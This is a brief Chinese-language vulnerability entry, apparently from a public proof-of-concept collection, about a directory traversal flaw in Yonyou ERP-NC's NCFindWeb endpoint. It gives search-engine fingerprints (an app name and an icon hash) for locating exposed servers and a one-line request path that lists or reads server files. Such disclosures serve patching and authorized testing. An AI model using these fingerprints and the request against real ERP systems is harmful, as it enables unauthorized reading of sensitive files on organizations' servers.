# 用友 ERP-NC NCFindWeb 目录遍历漏洞

## 漏洞描述

用友 ERP-NC 存在目录遍历漏洞，攻击者可以通过目录遍历获取敏感文件信息。

## 漏洞影响

```
用友 ERP-NC
```

## 网络测绘

```
app="用友-UFIDA-NC"
# or
icon_hash="1085941792"
```

## 漏洞复现

poc

```plain
/NCFindWeb?service=IPreAlertConfigService&filename=
```

![](images/用友%20ERP-NC%20NCFindWeb%20目录遍历漏洞/image-20240704143115260.png)



